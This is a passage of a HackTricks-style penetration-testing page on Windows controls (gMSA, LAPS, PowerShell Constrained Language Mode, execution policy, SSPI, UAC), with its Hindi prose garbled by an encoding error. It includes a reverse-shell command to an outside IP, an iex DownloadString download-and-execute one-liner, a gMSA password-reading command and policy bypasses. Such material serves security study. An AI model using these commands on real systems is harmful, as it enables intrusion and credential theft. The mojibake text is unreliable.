рд╣реИрдВред

#### Knowing the users password

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Group Managed Service Accounts (gMSA)

Microsoft рдиреЗ IT рдмреБрдирд┐рдпрд╛рджреА рдврд╛рдВрдЪреЛрдВ рдореЗрдВ рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХреЗ рдкреНрд░рдмрдВрдзрди рдХреЛ рд╕рд░рд▓ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП **Group Managed Service Accounts (gMSA)** рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдпрд╛ред рдкрд╛рд░рдВрдкрд░рд┐рдХ рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХреЗ рд╡рд┐рдкрд░реАрдд рдЬрд┐рдирдореЗрдВ рдЕрдХреНрд╕рд░ "**рдкрд╛рд╕рд╡рд░реНрдб рдХрднреА рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрддрд╛**" рд╕реЗрдЯрд┐рдВрдЧ рд╕рдХреНрд╖рдо рд╣реЛрддреА рд╣реИ, gMSA рдПрдХ рдЕрдзрд┐рдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдФрд░ рдкреНрд░рдмрдВрдзрдиреАрдп рд╕рдорд╛рдзрд╛рди рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ:

* **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рдмрдВрдзрди**: gMSA рдПрдХ рдЬрдЯрд┐рд▓, 240-рдЪрд░рд┐рддреНрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдбреЛрдореЗрди рдпрд╛ рдХрдВрдкреНрдпреВрдЯрд░ рдиреАрддрд┐ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдмрджрд▓рддрд╛ рд╣реИред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ Microsoft рдХреА рдХреА рд╡рд┐рддрд░рдг рд╕реЗрд╡рд╛ (KDC) рджреНрд╡рд╛рд░рд╛ рд╕рдВрднрд╛рд▓реА рдЬрд╛рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдореИрдиреНрдпреБрдЕрд▓ рдкрд╛рд╕рд╡рд░реНрдб рдЕрдкрдбреЗрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рддреА рд╣реИред
* **рд╕реБрд░рдХреНрд╖рд╛ рдореЗрдВ рд╡реГрджреНрдзрд┐**: рдпреЗ рдЦрд╛рддреЗ рд▓реЙрдХрдЖрдЙрдЯ рдХреЗ рдкреНрд░рддрд┐ рдкреНрд░рддрд┐рд░рдХреНрд╖рд┐рдд рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд▓реЙрдЧрд┐рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ, рдЬрд┐рд╕рд╕реЗ рдЙрдирдХреА рд╕реБрд░рдХреНрд╖рд╛ рдмрдврд╝рддреА рд╣реИред
* **рдХрдИ рд╣реЛрд╕реНрдЯ рд╕рдорд░реНрдерди**: gMSA рдХреЛ рдХрдИ рд╣реЛрд╕реНрдЯреЛрдВ рдХреЗ рдмреАрдЪ рд╕рд╛рдЭрд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдпреЗ рдХрдИ рд╕рд░реНрд╡рд░реЛрдВ рдкрд░ рдЪрд▓рдиреЗ рд╡рд╛рд▓реА рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЖрджрд░реНрд╢ рдмрди рдЬрд╛рддреЗ рд╣реИрдВред
* **рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд╛рд░реНрдп рдХреНрд╖рдорддрд╛**: рдкреНрд░рдмрдВрдзрд┐рдд рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХреЗ рд╡рд┐рдкрд░реАрдд, gMSA рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВред
* **рд╕рд░рд▓ SPN рдкреНрд░рдмрдВрдзрди**: рдЬрдм рдХрдВрдкреНрдпреВрдЯрд░ рдХреЗ sAMaccount рд╡рд┐рд╡рд░рдг рдпрд╛ DNS рдирд╛рдо рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рд╕рд┐рд╕реНрдЯрдо рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╕реЗрд╡рд╛ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдирд╛рдо (SPN) рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ SPN рдкреНрд░рдмрдВрдзрди рд╕рд░рд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

gMSA рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб LDAP рдкреНрд░реЙрдкрд░реНрдЯреА _**msDS-ManagedPassword**_ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рд╣рд░ 30 рджрд┐рди рдореЗрдВ рдбреЛрдореЗрди рдирд┐рдпрдВрддреНрд░рдХреЛрдВ (DCs) рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд░реАрд╕реЗрдЯ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдпрд╣ рдкрд╛рд╕рд╡рд░реНрдб, рдЬрд┐рд╕реЗ [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдХреЗрд╡рд▓ рдЕрдзрд┐рдХреГрдд рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдФрд░ рдЙрди рд╕рд░реНрд╡рд░реЛрдВ рджреНрд╡рд╛рд░рд╛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рди рдкрд░ gMSA рд╕реНрдерд╛рдкрд┐рдд рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рд╡рд╛рддрд╛рд╡рд░рдг рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рд╣реЛрддрд╛ рд╣реИред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрдиреЗрдХреНрд╢рди рдЬреИрд╕реЗ LDAPS рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдпрд╛ рдХрдиреЗрдХреНрд╢рди рдХреЛ 'Sealing & Secure' рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

рдЖрдк рдЗрд╕ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред
```
/GMSAPasswordReader --AccountName jkohler
```
[**рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://cube0x0.github.io/Relaying-for-gMSA/)

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **gMSA** рдХреЗ **рдкрд╛рд╕рд╡рд░реНрдб** рдХреЛ **рдкрдврд╝рдиреЗ** рдХреЗ рд▓рд┐рдП **NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЗ** рдХреЛ рдХреИрд╕реЗ рдХрд░рдирд╛ рд╣реИ, рдЗрд╕ рдмрд╛рд░реЗ рдореЗрдВ рдЗрд╕ [рд╡реЗрдм рдкреГрд╖реНрда](https://cube0x0.github.io/Relaying-for-gMSA/) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред

## LAPS

**рд▓реЛрдХрд▓ рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЙрд▓реНрдпреВрд╢рди (LAPS)**, рдЬрд┐рд╕реЗ [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╕реНрдерд╛рдиреАрдп рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпреЗ рдкрд╛рд╕рд╡рд░реНрдб, рдЬреЛ **рдпрд╛рджреГрдЪреНрдЫрд┐рдХ**, рдЕрджреНрд╡рд┐рддреАрдп, рдФрд░ **рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдмрджрд▓реЗ рдЬрд╛рддреЗ рд╣реИрдВ**, рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдХреЗрдВрджреНрд░реАрдп рд░реВрдк рд╕реЗ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВред рдЗрди рдкрд╛рд╕рд╡рд░реНрдбреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рдЕрдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП ACLs рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реАрдорд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде, рд╕реНрдерд╛рдиреАрдп рдПрдбрдорд┐рди рдкрд╛рд╕рд╡рд░реНрдб рдкрдврд╝рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рддреА рд╣реИред

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **рдХрдИ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЛ рд▓реЙрдХ рдХрд░ рджреЗрддрд╛ рд╣реИ** рдЬреЛ PowerShell рдХрд╛ рдкреНрд░рднрд╛рд╡реА рдврдВрдЧ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВ, рдЬреИрд╕реЗ COM рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдирд╛, рдХреЗрд╡рд▓ рдЕрдиреБрдореЛрджрд┐рдд .NET рдкреНрд░рдХрд╛рд░реЛрдВ, XAML-рдЖрдзрд╛рд░рд┐рдд рд╡рд░реНрдХрдлрд╝реНрд▓реЛ, PowerShell рдХрдХреНрд╖рд╛рдУрдВ, рдФрд░ рдЕрдзрд┐рдХ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ред

### **рдЬрд╛рдВрдЪреЗрдВ**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### рдмрд╛рдпрдкрд╛рд╕
```powershell
#Easy bypass
Powershell -version 2
```
рд╡рд░реНрддрдорд╛рди Windows рдореЗрдВ рд╡рд╣ Bypass рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ рд▓реЗрдХрд┐рди рдЖрдк [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
**рдЗрд╕реЗ рд╕рдВрдХрд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ** **рдЬрд╝рд░реВрд░рдд рд╣реЛ рд╕рдХрддреА рд╣реИ** **_рдПрдХ рд╕рдВрджрд░реНрдн рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП_** -> _рдмреНрд░рд╛рдЙрдЬрд╝_ -> _рдмреНрд░рд╛рдЙрдЬрд╝_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` рдЬреЛрдбрд╝реЗрдВ рдФрд░ **рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЛ .Net4.5 рдореЗрдВ рдмрджрд▓реЗрдВ**ред

#### рд╕реАрдзреЗ рдмрд╛рдпрдкрд╛рд╕:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
рдЖрдк [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) рдпрд╛ [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **Powershell** рдХреЛрдб рдХреЛ рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕реАрдорд┐рдд рдореЛрдб рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS рдирд┐рд╖реНрдкрд╛рджрди рдиреАрддрд┐

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЗрд╕реЗ **рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд** рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрд╕ рдиреАрддрд┐ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рдореБрдЦреНрдп рддрд░реАрдХреЗ:
```powershell
1┬║ Just copy and paste inside the interactive PS console
2┬║ Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3┬║ Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4┬║ Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5┬║ Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6┬║ Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7┬║ Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8┬║ Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9┬║ Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

рдпрд╣ API рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

SSPI рдЙрди рджреЛ рдорд╢реАрдиреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реЛрдЧрд╛ рдЬреЛ рд╕рдВрд╡рд╛рдж рдХрд░рдирд╛ рдЪрд╛рд╣рддреА рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП рдкрд╕рдВрджреАрджрд╛ рд╡рд┐рдзрд┐ Kerberos рд╣реИред рдлрд┐рд░ SSPI рдпрд╣ рдмрд╛рддрдЪреАрдд рдХрд░реЗрдЧрд╛ рдХрд┐ рдХреМрди рд╕рд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ Security Support Provider (SSP) рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдкреНрд░рддреНрдпреЗрдХ Windows рдорд╢реАрди рдХреЗ рдЕрдВрджрд░ DLL рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рджреЛрдиреЛрдВ рдорд╢реАрдиреЛрдВ рдХреЛ рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдорд╛рди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

### рдореБрдЦреНрдп SSPs

* **Kerberos**: рдкрд╕рдВрджреАрджрд╛
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** рдФрд░ **NTLMv2**: рд╕рдВрдЧрддрддрд╛ рдХрд╛рд░рдгреЛрдВ рд╕реЗ
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: рд╡реЗрдм рд╕рд░реНрд╡рд░ рдФрд░ LDAP, MD5 рд╣реИрд╢ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL рдФрд░ TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (Kerberos рдпрд╛ NTLM, рдЬрд┐рд╕рдореЗрдВ Kerberos рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╣реИ)
* %windir%\Windows\System32\lsasrv.dll

#### рдмрд╛рддрдЪреАрдд рдХрдИ рд╡рд┐рдзрд┐рдпрд╛рдБ рдпрд╛ рдХреЗрд╡рд▓ рдПрдХ рдкреЗрд╢ рдХрд░ рд╕рдХрддреА рд╣реИред

## UAC - рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдирд┐рдпрдВрддреНрд░рдг

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реИ рдЬреЛ **рдЙрдиреНрдирдд рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рд╕рдВрдХреЗрдд** рд╕рдХреНрд╖рдо рдХрд░рддреА рд╣реИред

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
